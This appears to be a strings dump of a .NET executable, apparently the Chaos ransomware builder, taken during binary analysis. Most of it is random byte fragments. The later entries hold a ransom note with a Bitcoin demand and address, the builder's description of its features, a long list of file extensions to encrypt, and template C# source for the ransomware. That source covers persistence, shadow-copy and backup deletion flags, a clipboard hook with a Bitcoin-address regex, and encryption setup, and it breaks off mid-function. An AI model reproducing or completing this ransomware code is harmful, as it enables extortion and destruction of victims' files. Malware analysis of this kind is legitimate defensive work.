Metadata Signature: 0x7e94 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 2900
Stream name: #~ 4
DirectoryAddress: 296c Size: 26ec
Stream name: #Strings 12
DirectoryAddress: 5058 Size: 18e0
Stream name: #US 4
DirectoryAddress: 6938 Size: 10
Stream name: #GUID 8
DirectoryAddress: 6948 Size: e74
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
1045 0x00011b4b 0x0041394b 4    5    .text   ascii   Oq~i
1046 0x00011b7c 0x0041397c 6    7    .text   ascii   CS]iM$
1047 0x00011ba5 0x004139a5 5    7    .text   utf8    Dlb{ۺ blocks=Basic Latin,Arabic
1048 0x00011bad 0x004139ad 8    11   .text   utf8    nv\v镫moH2 blocks=Basic Latin,CJK Unified Ideographs
1049 0x00011bd1 0x004139d1 4    5    .text   ascii   lv}8
1050 0x00011bea 0x004139ea 7    9    .text   utf8    /R-UVԲv blocks=Basic Latin,Armenian
1051 0x00011c07 0x00413a07 4    6    .text   utf8    ۘmW@ blocks=Arabic,Basic Latin
1052 0x00011cf9 0x00413af9 6    7    .text   ascii   ::Dy1G
1053 0x00011d03 0x00413b03 5    7    .text   utf8    P^ʱps blocks=Basic Latin,Spacing Modifier Letters
1054 0x00011d1b 0x00413b1b 5    8    .text   utf8    xg\a㯼# blocks=Basic Latin,CJK Unified Ideographs Extension A
1055 0x00011d47 0x00413b47 7    9    .text   utf8    ÀS%W`yr blocks=Latin-1 Supplement,Basic Latin
1056 0x00011d94 0x00413b94 7    8    .text   ascii   nPZjM\eR
1057 0x00011e3e 0x00413c3e 4    6    .text   utf8    7ۊdw blocks=Basic Latin,Arabic
1058 0x00011e87 0x00413c87 4    6    .text   utf8    \rt_7
1059 0x00011eb7 0x00413cb7 5    6    .text   ascii   d<DG\
1060 0x00011f08 0x00413d08 7    8    .text   ascii   \r(#/lx,
1061 0x00011f1c 0x00413d1c 4    6    .text   utf8    Uיew blocks=Basic Latin,Hebrew
1062 0x00011f39 0x00413d39 4    5    .text   ascii   \eJOC
1063 0x00011f69 0x00413d69 5    8    .text   utf8    =Xc\f㯾 blocks=Basic Latin,CJK Unified Ideographs Extension A
1064 0x00011fc4 0x00413dc4 4    5    .text   ascii   h:A4
1065 0x00011fd8 0x00413dd8 10   11   .text   ascii   G%W$?3OnjN
1066 0x00012000 0x00413e00 4    6    .text   utf8    fۜKK blocks=Basic Latin,Arabic
1067 0x00012089 0x00413e89 4    5    .text   ascii   Oi1G
1068 0x00012093 0x00413e93 6    8    .text   utf8    t}GӞie blocks=Basic Latin,Cyrillic
1069 0x000120d4 0x00413ed4 8    10   .text   utf8    \aeThAֻ^~ blocks=Basic Latin,Hebrew
1070 0x000120de 0x00413ede 4    5    .text   ascii   F5_l
1071 0x000120e3 0x00413ee3 4    5    .text   ascii   0A)H
1072 0x00012154 0x00413f54 5    6    .text   ascii   I:G\a8
1073 0x00012169 0x00413f69 4    5    .text   ascii   nL4|
1074 0x0001218f 0x00413f8f 5    7    .text   utf8    P2ܲ\a( blocks=Basic Latin,Syriac
1075 0x0001220e 0x0041400e 4    5    .text   ascii   QUjp
1076 0x00012216 0x00414016 4    5    .text   ascii   \r2#p
1077 0x00012225 0x00414025 4    6    .text   utf8    /HЀM blocks=Basic Latin,Cyrillic
1078 0x0001222b 0x0041402b 4    5    .text   ascii   $\v7'
1079 0x00012256 0x00414056 4    5    .text   ascii   #oL<
1080 0x0001225d 0x0041405d 5    6    .text   ascii   S/PY.
1081 0x00012289 0x00414089 4    6    .text   utf8    PφZ~ blocks=Basic Latin,Greek and Coptic
1082 0x000122c2 0x004140c2 4    5    .text   ascii   G\enO
1083 0x0001238b 0x0041418b 4    8    .text   utf8    \e㗁;& blocks=Basic Latin,CJK Unified Ideographs Extension A
1084 0x000123c5 0x004141c5 8    10   .text   utf8    o9!z\rNĥV blocks=Basic Latin,Latin Extended-A
1085 0x000123f4 0x004141f4 5    6    .text   ascii   mk#U(
1086 0x000124e8 0x004142e8 4    5    .text   ascii   <5Gu
1087 0x00012501 0x00414301 5    6    .text   ascii   77;_h
1088 0x00012572 0x00414372 5    6    .text   ascii   v4h#$
1089 0x00012582 0x00414382 4    5    .text   ascii   9Aqn
1090 0x00012597 0x00414397 4    5    .text   ascii   T(-,
1091 0x000125b8 0x004143b8 5    6    .text   ascii   \rk\a|6
1092 0x000125fc 0x004143fc 6    8    .text   utf8    iIŅef. blocks=Basic Latin,Latin Extended-A
1093 0x00012640 0x00414440 5    6    .text   ascii   {?ny\
1094 0x0001268c 0x0041448c 4    6    .text   utf8    %=нa blocks=Basic Latin,Cyrillic
1095 0x000126a8 0x004144a8 4    5    .text   ascii   Y3#}
1096 0x000126b6 0x004144b6 4    6    .text   utf8    Rێ}? blocks=Basic Latin,Arabic
1097 0x000126c3 0x004144c3 4    6    .text   utf8    9Jױa blocks=Basic Latin,Hebrew
1098 0x00012714 0x00414514 4    7    .text   utf8    Dîιk blocks=Basic Latin,Latin-1 Supplement,Greek and Coptic
1099 0x00012737 0x00414537 4    5    .text   ascii   P"?=
1100 0x00012776 0x00414576 4    7    .text   utf8    +9> blocks=Basic Latin,Private Use Area
1101 0x000127ac 0x004145ac 5    6    .text   ascii   Iidjb
1102 0x000127c8 0x004145c8 5    6    .text   ascii   Z,oZ_
1103 0x000127e8 0x004145e8 11   14   .text   utf8    3\v,ݙ&?=߲>_, blocks=Basic Latin,Arabic Supplement,NKo
1104 0x00012807 0x00414607 4    5    .text   ascii   QH9k
1105 0x00012831 0x00414631 4    5    .text   ascii   Z#79
1106 0x0001283c 0x0041463c 4    6    .text   utf8    $ưi~ blocks=Basic Latin,Latin Extended-B
1107 0x00012879 0x00414679 4    5    .text   ascii   \f>~r
1108 0x0001287f 0x0041467f 4    5    .text   ascii   V\vEn
1109 0x000128d2 0x004146d2 4    5    .text   ascii   q".K
1110 0x000128e6 0x004146e6 4    5    .text   ascii   ~Laf
1111 0x00012925 0x00414725 7    8    .text   ascii   }bT&-\a-
1112 0x000129b6 0x004147b6 4    6    .text   utf8    &֑$3 blocks=Basic Latin,Hebrew
1113 0x000129f9 0x004147f9 4    6    .text   utf8    s]|ߗ blocks=Basic Latin,NKo
1114 0x00012a35 0x00414835 8    9    .text   ascii   \bsWooyh'
1115 0x00012aae 0x004148ae 4    5    .text   ascii   F]zO
1116 0x00012ad1 0x004148d1 4    5    .text   ascii   X:I<
1117 0x00012b29 0x00414929 5    7    .text   utf8    R(6-̙ blocks=Basic Latin,Combining Diacritical Marks
1118 0x00012b33 0x00414933 4    5    .text   ascii   S/0{
1119 0x00012b51 0x00414951 4    5    .text   ascii   (Np?
1120 0x00012bee 0x004149ee 4    6    .text   utf8    K'Ɍ\f blocks=Basic Latin,Latin Extended-B
1121 0x00012bf4 0x004149f4 8    10   .text   utf8    UkԊ%JKyq blocks=Basic Latin,Cyrillic Supplement
1122 0x00012c02 0x00414a02 6    9    .text   utf8    A\a隮#C" blocks=Basic Latin,CJK Unified Ideographs
1123 0x00012c0d 0x00414a0d 7    9    .text   utf8    PZX&?5ˏ blocks=Basic Latin,Spacing Modifier Letters
1124 0x00012c73 0x00414a73 5    6    .text   ascii   \f='FI
1125 0x00012c7d 0x00414a7d 5    8    .text   utf8    'פ<uĥ blocks=Basic Latin,Hebrew,Latin Extended-A
1126 0x00012cbe 0x00414abe 5    7    .text   utf8    Yܲqe5 blocks=Basic Latin,Syriac
1127 0x00012cd7 0x00414ad7 8    9    .text   ascii   3\f>{CO>B
1128 0x00012ce3 0x00414ae3 4    5    .text   ascii   \a{)/
1129 0x00012d31 0x00414b31 5    6    .text   ascii   '%E\eD
1130 0x00012d4a 0x00414b4a 7    8    .text   ascii   `\fsWo1u
1131 0x00012d70 0x00414b70 4    5    .text   ascii   L_PW
1132 0x00012da8 0x00414ba8 4    5    .text   ascii   v@+2
1133 0x00012df0 0x00414bf0 4    5    .text   ascii   <GHj
1134 0x00012e75 0x00414c75 4    5    .text   ascii   UQGZ
1135 0x00012ecd 0x00414ccd 4    5    .text   ascii   _X\tT
1136 0x00012f42 0x00414d42 7    9    .text   utf8    7_#֑"{x blocks=Basic Latin,Hebrew
1137 0x00012f94 0x00414d94 6    8    .text   utf8    ,ݺK9W` blocks=Basic Latin,Arabic Supplement
1138 0x00012faa 0x00414daa 6    8    .text   utf8    ɘF#R}] blocks=IPA Extensions,Basic Latin
1139 0x00012fb4 0x00414db4 5    6    .text   ascii   E2#}$
1140 0x00012fd2 0x00414dd2 4    6    .text   utf8    }lDʆ blocks=Basic Latin,IPA Extensions
1141 0x0001303c 0x00414e3c 5    7    .text   utf8    Z,SZȵ blocks=Basic Latin,Latin Extended-B
1142 0x00013054 0x00414e54 4    5    .text   ascii   ?Oaf
1143 0x00013070 0x00414e70 4    5    .text   ascii   Ei1G
1144 0x0001308d 0x00414e8d 4    5    .text   ascii   N,J4
1145 0x000130da 0x00414eda 9    11   .text   utf8    .H\n7_$75ߚ blocks=Basic Latin,NKo
1146 0x00013118 0x00414f18 5    6    .text   ascii   \b4\n9O
1147 0x000131a3 0x00414fa3 5    6    .text   ascii   jas+_
1148 0x0001322d 0x0041502d 4    5    .text   ascii   ?C\vp
1149 0x00013258 0x00415058 8    9    .text   ascii   I \nfXiG\a
1150 0x0001329a 0x0041509a 6    7    .text   ascii    yFE08
1151 0x000132d9 0x004150d9 4    6    .text   utf8    %`Qڏ blocks=Basic Latin,Arabic
1152 0x00013300 0x00415100 5    6    .text   ascii   Z,{B8
1153 0x000133f5 0x004151f5 4    5    .text   ascii   wL \e
1154 0x00013459 0x00415259 7    8    .text   ascii   .#\r@ma'
1155 0x00013486 0x00415286 9    11   .text   utf8    ҟlg\bZ,mC& blocks=Cyrillic,Basic Latin
1156 0x00013556 0x00415356 4    6    .text   utf8    Ų3B\a blocks=Latin Extended-A,Basic Latin
1157 0x00013592 0x00415392 4    6    .text   utf8    ڷXZc blocks=Arabic,Basic Latin
1158 0x000135c2 0x004153c2 5    6    .text   ascii   4RlWl
1159 0x000136b8 0x004154b8 4    5    .text   ascii   ^-\bo
1160 0x000137a8 0x004155a8 5    7    .text   utf8    H#JAǀ blocks=Basic Latin,Latin Extended-B
1161 0x000137e6 0x004155e6 6    7    .text   ascii   Q\netP\e
1162 0x00013839 0x00415639 4    5    .text   ascii   \r\DT
1163 0x0001384f 0x0041564f 4    5    .text   ascii   4JiL
1164 0x00013855 0x00415655 4    5    .text   ascii   Htp?
1165 0x0001385b 0x0041565b 4    6    .text   utf8    ŲsV\e blocks=Latin Extended-A,Basic Latin
1166 0x00013871 0x00415671 5    8    .text   utf8    L؟զV} blocks=Basic Latin,Arabic,Armenian
1167 0x00013886 0x00415686 5    6    .text   ascii   -\b_b=
1168 0x000138ac 0x004156ac 5    7    .text   utf8    \f"O8\n
1169 0x000138c1 0x004156c1 4    5    .text   ascii   \tj{|
1170 0x000138ea 0x004156ea 4    5    .text   ascii   6]h9
1171 0x0001390d 0x0041570d 5    7    .text   utf8    @ܣ\t$S blocks=Basic Latin,Syriac
1172 0x00013952 0x00415752 4    5    .text   ascii   \tD\r*
1173 0x00013985 0x00415785 4    5    .text   ascii   s\a-{
1174 0x000139ac 0x004157ac 5    6    .text   ascii   m,0U.
1175 0x00013a58 0x00415858 6    7    .text   ascii   c6.`i\e
1176 0x00013a86 0x00415886 5    6    .text   ascii   uPZi'
1177 0x00013a8c 0x0041588c 4    5    .text   ascii   gv[`
1178 0x00013aac 0x004158ac 4    5    .text   ascii   `3jH
1179 0x00013ac8 0x004158c8 4    5    .text   ascii   15?h
1180 0x00013b23 0x00415923 4    6    .text   utf8    ҮVJ) blocks=Cyrillic,Basic Latin
1181 0x00013b69 0x00415969 4    5    .text   ascii   Y6%|
1182 0x00013b83 0x00415983 4    5    .text   ascii   A\\t?
1183 0x00013b8e 0x0041598e 4    5    .text   ascii   Jk-^
1184 0x00013c11 0x00415a11 4    5    .text   ascii   /~x0
1185 0x00013d5f 0x00415b5f 4    6    .text   utf8    \td"ϛ blocks=Basic Latin,Greek and Coptic
1186 0x00013d6e 0x00415b6e 4    5    .text   ascii   YH"Y
1187 0x00013dad 0x00415bad 4    6    .text   utf8    7(}ϲ blocks=Basic Latin,Greek and Coptic
1188 0x00013df2 0x00415bf2 4    5    .text   ascii   hv-#
1189 0x00013e17 0x00415c17 4    5    .text   ascii   oV\vw
1190 0x00013e4b 0x00415c4b 4    5    .text   ascii   \aL\rc
1191 0x00013e70 0x00415c70 8    9    .text   ascii   \ec\fJim;\v
1192 0x00013e7e 0x00415c7e 4    6    .text   utf8    ^_Xӏ blocks=Basic Latin,Cyrillic
1193 0x00013e91 0x00415c91 7    10   .text   utf8    \v짵9\`\b) blocks=Basic Latin,Hangul Syllables
1194 0x00013f26 0x00415d26 4    5    .text   ascii   {?bc
1195 0x00013f66 0x00415d66 4    6    .text   utf8    aRiǩ blocks=Basic Latin,Latin Extended-B
1196 0x000140a9 0x00415ea9 4    5    .text   ascii   IEND
1197 0x00023b80 0x00425980 16   68   .text   utf32le \e-.......y|{{{{{
1198 0x00024b78 0x00426978 13   56   .text   utf32le [ZZZZ[[[[VVVU
1199 0x00028c5c 0x0042aa5c 4    20   .text   utf32le \r\r\r\n
1200 0x0002aebc 0x0042ccbc 11   48   .text   utf32le \e ++29ĹĽŀ@3 blocks=Basic Latin,Latin Extended-A
1201 0x0002c5bc 0x0042e3bc 963  964  .text   ascii   \a----> Chaos is multi language ransomware. Translate your note to any language <----\r\nAll of your files have been encrypted\r\nYour computer was infected with a ransomware virus. Your files have been encrypted and you won't \r\nbe able to decrypt them without our help.What can I do to get my files back?You can buy our special \r\ndecryption software, this software will allow you to recover all of your data and remove the\r\nransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.\r\nHow do I pay, where do I get Bitcoin?\r\nPurchasing Bitcoin varies from country to country, you are best advised to do a quick google search\r\nyourself  to find out how to buy Bitcoin. \r\nMany of our customers have reported these sites to be fast and reliable:\r\nCoinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com\r\n\r\nPayment informationAmount: 0.1473766 BTC\r\nBitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0\r\n
1202 0x0002c990 0x0042e790 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1203 0x0002ca2d 0x0042e82d 8    9    .text   ascii   PADPADPA
1204 0x0002ca41 0x0042e841 11   24   .text   utf16le label1.Text
1205 0x0002ca5e 0x0042e85e 568  569  .text   ascii   Chaos is multi language ransomware which \r\nmeans you can translate your note to any\r\n language. This Ransoware encrypts all files \r\nand drops a note for every folder in which files have \r\nbeen encrypted. You can overwrite all files or encrypt \r\nthem with aes/rsa encryption method. Create \r\nyour decrypter using the advanced option. \r\nPublic and private keys will be created automatically. \r\nKeep private key and decrypter. Without them files \r\ncannot be returned.\r\nThis project depends on your donation. \r\nPlease donete if you want to see next\r\nreleases in the future
1206 0x0002cca8 0x0042eaa8 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1207 0x0002cd45 0x0042eb45 7    8    .text   ascii   PADPADP
1208 0x0002cd60 0x0042eb60 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1209 0x0002cdfd 0x0042ebfd 8    9    .text   ascii   PADPADP/
1210 0x0002ce11 0x0042ec11 13   28   .text   utf16le textBox1.Text
1211 0x0002ce31 0x0042ec31 1683 1684 .text   ascii   \r".txt",".jar",".dat",".contact",".settings",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".odt",".jpg",".mka",".mhtml",".oqy",".png",".csv",".py",".sql",".mdb",".php",".asp",".aspx",".html",".htm",".xml",".psd",".pdf",".xla",".cub",".dae",".indd",".cs",".mp3",".mp4",".dwg",".zip",".rar",".mov",".rtf",".bmp",".mkv",".avi",".apk",".lnk",".dib",".dic",".dif",".divx",".iso",".7zip",".ace",".arj",".bz2",".cab",".gzip",".lzh",".tar",".jpeg",".xz",".mpeg",".torrent",".mpg",".core",".pdb",".ico",".pas",".db",".wmv",".swf",".cer",".bak",".backup",".accdb",".bay",".p7c",".exif",".vss",".raw",".m4a",".wma",".flv",".sie",".sum",".ibank",".wallet",".css",".js",".rb",".crt",".xlsm",".xlsb",".7z",".cpp",".java",".jpe",".ini",".blob",".wps",".docm",".wav",".3gp",".webm",".m4v",".amv",".m4p",".svg",".ods",".bk",".vdi",".vmdk",".onepkg",".accde",".jsp",".json",".gif",".log",".gz",".config",".vb",".m1v",".sln",".pst",".obj",".xlam",".djvu",".inc",".cvs",".dbf",".tbi",".wpd",".dot",".dotx",".xltx",".pptm",".potx",".potm",".pot",".xlw",".xps",".xsd",".xsf",".xsl",".kmz",".accdr",".stm",".accdt",".ppam",".pps",".ppsm",".1cd",".3ds",".3fr",".3g2",".accda",".accdc",".accdw",".adp",".ai",".ai3",".ai4",".ai5",".ai6",".ai7",".ai8",".arw",".ascx",".asm",".asmx",".avs",".bin",".cfm",".dbx",".dcm",".dcr",".pict",".rgbe",".dwt",".f4v",".exr",".kwm",".max",".mda",".mde",".mdf",".mdw",".mht",".mpv",".msg",".myi",".nef",".odc",".geo",".swift",".odm",".odp",".oft",".orf",".pfx",".p12",".pl",".pls",".safe",".tab",".vbs",".xlk",".xlm",".xlt",".xltm",".svgz",".slk",".tar.gz",".dmg",".ps",".psb",".tif",".rss",".key",".vob",".epsp",".dc3",".iff",".onepkg",".onetoc2",".opt",".p7b",".pam",".r3d"
1212 0x0002d4d8 0x0042f2d8 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1213 0x0002d575 0x0042f375 7    8    .text   ascii   PADPADP
1214 0x0002d591 0x0042f391 6    14   .text   utf16le Source
1215 0x0002d5a2 0x0042f3a2 9    19   .text   utf16le decrypter
1216 0x0002d5bc 0x0042f3bc 1966 1966 .text   ascii   using System;\r\nusing System.Linq;\r\nusing System.Windows.Forms;\r\nusing System.Runtime.InteropServices;\r\nusing System.Text.RegularExpressions;\r\n\r\nnamespace ConsoleApplication7\r\n{\r\n    class Program\r\n    {\r\n        private static string userName = Environment.UserName;\r\n        private static string userDir = "C:\\Users\\";\r\n        public static string appMutexRun = "7z459ajrk722yn8c5j4fg";\r\n        public static bool encryptionAesRsa = #encryptOption;\r\n        public static string encryptedFileExtension = "#encryptedFileExtension";\r\n        private static bool checkSpread = #checkSpread;\r\n        private static string spreadName = "#spreadName";\r\n        private static bool checkCopyRoaming = #copyRoaming;\r\n        private static string processName = "#exeName";\r\n        public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";\r\n        private static bool checkStartupFolder = #startupFolder;\r\n        private static bool checkSleep = #checkSleep;\r\n        private static int sleepTextbox = #sleepTextbox;\r\n        private static string base64Image = @"#base64Image";\r\n        public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";\r\n        private static string droppedMessageTextbox = "#droppedMessageTextbox";\r\n        //************ Admin field **********\r\n        private static bool checkAdminPrivilage = #adminPrivilage;\r\n        private static bool checkdeleteShadowCopies = #checkdeleteShadowCopies;\r\n        private static bool checkdisableRecoveryMode = #checkdisableRecoveryMode;\r\n        private static bool checkdeleteBackupCatalog = #checkdeleteBackupCatalog;\r\n        //*****************\r\n        \r\n        public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";\r\n        public static string appMutex2 = appMutexStartup2 + appMutexRun2;\r\n        public static string staticSplit = "bc";\r\n        public static string appMutex = staticSplit+appMutexStartup + appMutexRun;\r\n        public readonly static Regex appMutexRegex = n
1217 0x0002dd6a 0x0042fb6a 1906 1907 .text   ascii   ew Regex(@"(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");\r\n        private static string[] messages = { \r\n                                #messages\r\n                            };\r\n        private static string[] validExtensions = new[]\r\n                {\r\n                    #extensions\r\n                };\r\n        public static class NativeMethods\r\n        {\r\n            [DllImport("user32.dll", SetLastError = true)]\r\n            [return: MarshalAs(UnmanagedType.Bool)]\r\n            public static extern bool AddClipboardFormatListener(IntPtr hwnd);\r\n\r\n            [DllImport("user32.dll", SetLastError = true)]\r\n            public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);\r\n\r\n            public const int clp = 0x031D;\r\n            public static IntPtr intpreclp = new IntPtr(-3);\r\n        }\r\n        [DllImport("user32.dll", CharSet = CharSet.Auto)]\r\n        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);\r\n        static void Main(string[] args)\r\n        {\r\n            if (AlreadyRunning())\r\n            {\r\n                System.Environment.Exit(1);\r\n            }\r\n            if (checkSleep)\r\n            {\r\n                sleepOutOfTempFolder();\r\n                //System.Threading.Thread.Sleep(sleepTextbox * 1000);\r\n            }\r\n            if (checkAdminPrivilage)\r\n            {\r\n                copyResistForAdmin(processName);\r\n            }\r\n            else\r\n            {\r\n                if (checkCopyRoaming)\r\n                {\r\n                    copyRoaming(processName);\r\n                }\r\n            }\r\n            if (checkStartupFolder)\r\n            {\r\n                addLinkToStartup();\r\n            }\r\n\r\n\r\n            lookForDirectories();\r\n\r\n            if (checkAdminPrivilage)\r\n            {\r\n                if (checkdeleteShadowCopies)\r\n                {
